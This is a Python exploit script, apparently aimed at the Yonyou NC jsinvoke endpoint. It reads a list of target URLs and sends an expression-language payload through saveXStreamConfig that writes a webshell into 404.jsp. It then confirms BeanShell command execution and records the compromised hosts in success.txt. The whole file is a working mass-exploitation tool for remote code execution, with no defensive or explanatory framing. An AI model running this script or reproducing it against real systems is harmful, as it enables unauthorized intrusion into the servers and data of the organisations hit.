import argparse
import requests
from time import time
from urllib.parse import urljoin

print('''
 _    _____                                     
| |__|___ / _ __   __ _ _   _  __ _ _ __   __ _ 
| '_ \ |_ \| '_ \ / _` | | | |/ _` | '_ \ / _` |
| |_) |__) | | | | (_| | |_| | (_| | | | | (_| |
|_.__/____/|_| |_|\__, |\__,_|\__,_|_| |_|\__, |
                  |___/                   |___/ 
脚本，启动！！！！
''')

def make_request(session, target, path, payload):
    url = urljoin(target, path)
    try:
        response = session.get(url, timeout=5, verify=False)
        if response.status_code == 200:
            response_1 = session.post(url, json=payload, timeout=5)
            if response_1.status_code in [200, 404]:
                response_2 = session.post(urljoin(target, "/404.jsp?error=bsh.Interpreter"), data=payload, timeout=5)
                if "出错" not in response_2.text:
                    return True
    except requests.RequestException as e:
        print(f"Error occurred while processing {url}: {e}")
    return False

parser = argparse.ArgumentParser()
parser.add_argument('-f', type=str, default=None, required=False,
                    help='输入文件路径')
parser.add_argument('-u', type=str, default=None, required=False,
                    help='输入url')
args = parser.parse_args()

urls = []

if args.f:
    with open(args.f, 'r') as f:
        lines = f.readlines()
        urls = [line.strip() for line in lines if not line.startswith('https')]
elif args.u:
    urls.append(args.u)
else:
    parser.print_help()
    exit()

payload = {
    "serviceName": "nc.itf.iufo.IBaseSPService",
    "methodName": "saveXStreamConfig",
    "parameterTypes": [
        "java.lang.Object",
        "java.lang.String"
    ],
    "parameters": [
        "${param.getClass().forName(param.error).newInstance().eval(param.cmd)}",
        "webapps/nc_web/404.jsp"
    ]
}

success_targets = []
print("[+]任务开始.....")
start = time()

with requests.Session() as session:
    for url in urls:
        if make_request(session, url, "/uapjs/jsinvoke?action=invoke", payload):
            success_targets.append(url)

end = time()
print('任务完成,用时%ds.' % (end - start))

with open('success.txt', 'w') as f:
    for target in success_targets:
        f.write(target + '\n')
